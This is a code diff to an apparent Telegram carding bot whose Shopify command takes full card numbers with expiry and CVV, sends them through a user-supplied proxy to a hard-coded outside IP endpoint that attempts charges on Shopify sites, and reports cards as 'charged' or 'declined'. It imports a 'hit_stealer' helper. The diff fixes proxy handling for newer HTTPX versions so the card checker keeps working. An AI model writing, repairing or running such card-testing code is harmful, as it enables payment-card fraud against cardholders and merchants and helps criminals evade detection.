@@ -9,7 +9,7 @@ from TOOLS.check_all_func import *
 from TOOLS.getbin import *
 from BOT.tools.hit_stealer import send_hit_if_approved
 
-# --- Helper: Intelligent Proxy Checker ---
+# --- Helper: Intelligent Proxy Checker (Fixed for New HTTPX) ---
 async def check_proxy_working(proxy_str):
     """Tests if the proxy is working. Supports host:port:user:pass and host:port."""
     try:
@@ -24,8 +24,8 @@ async def check_proxy_working(proxy_str):
         else:
             return False, "Invalid Format (Use host:port:user:pass)"
 
-        # Increased timeout to 20s for slower proxies
-        async with httpx.AsyncClient(proxies=proxy_url, timeout=20, follow_redirects=True) as client:
+        # FIXED: Changed 'proxies' to 'proxy' for newer HTTPX versions
+        async with httpx.AsyncClient(proxy=proxy_url, timeout=20, follow_redirects=True) as client:
             response = await client.get("http://google.com")
             if response.status_code == 200:
                 return True, "Working ✅"
@@ -100,10 +100,10 @@ async def sfs_shopify_cmd(Client, message):
         first_name = message.from_user.first_name
         
         # 1. Check User Config
-        user_proxy = await get_user_proxy(user_id)
+        user_proxy_raw = await get_user_proxy(user_id)
         user_sites = await get_user_sites(user_id)
         
-        if not user_proxy:
+        if not user_proxy_raw:
             return await message.reply("❌ **No Proxy Set!**\nUse `/setproxy host:port:user:pass` first.", quote=True)
         if not user_sites:
             return await message.reply("❌ **No Sites Added!**\nUse `/addsite https://site.com` first.", quote=True)
@@ -119,31 +119,42 @@ async def sfs_shopify_cmd(Client, message):
         cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
         fullcc = f"{cc}|{mes}|{ano}|{cvv}"
         
-        # 3. Prepare API Call (Using first saved site)
+        # 3. Format Proxy for HTTPX
+        parts = user_proxy_raw.split(':')
+        if len(parts) == 4:
+            host, port, user, pwd = parts
+            user_proxy = f"socks5://{user}:{pwd}@{host}:{port}"
+        else:
+            host, port = parts
+            user_proxy = f"http://{host}:{port}"
+
+        # 4. Prepare API Call (Using first saved site)
         target_site = user_sites[0] 
         encoded_site = urllib.parse.quote(target_site)
-        encoded_proxy = urllib.parse.quote(user_proxy)
-        endpoint_url = f"http://108.165.12.183:8081/?cc={fullcc}&url={encoded_site}&proxy={encoded_proxy}"
+        encoded_proxy_raw = urllib.parse.quote(user_proxy_raw)
+        endpoint_url = f"http://108.165.12.183:8081/?cc={fullcc}&url={encoded_site}&proxy={encoded_proxy_raw}"
 
-        # 4. Animation & Processing
+        # 5. Animation & Processing
         loading_msg = await message.reply("🍳", quote=True)
         start = time.perf_counter()
         
         async def call_api():
-            async with httpx.AsyncClient(timeout=60) as session:
+            # FIXED: Changed 'proxies' to 'proxy' for newer HTTPX versions
+            async with httpx.AsyncClient(proxy=user_proxy, timeout=60) as session:
                 try:
                     response_obj = await session.get(endpoint_url)
                     res = response_obj.json()
                     api_resp = res.get("Response", "No Response")
                     status = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 🔥" if "completed" in api_resp.lower() else "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌"
                     return status, f"{api_resp} | Price: {res.get('Price','N/A')} | Site: {res.get('Site','N/A')}"
-                except: return "Error", "API Timeout/Error"
+                except Exception as e: 
+                    return "Error", f"API Error: {str(e)}"
 
         task = asyncio.create_task(call_api())
         await asyncio.sleep(2) # Ensure animation plays
         status, response = await task
 
-        # 5. Final Response
+        # 6. Final Response
         getbin = await get_bin_details(cc)
         brand, type_, level, bank, country, flag = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5]
         elapsed = round(time.perf_counter() - start, 2)
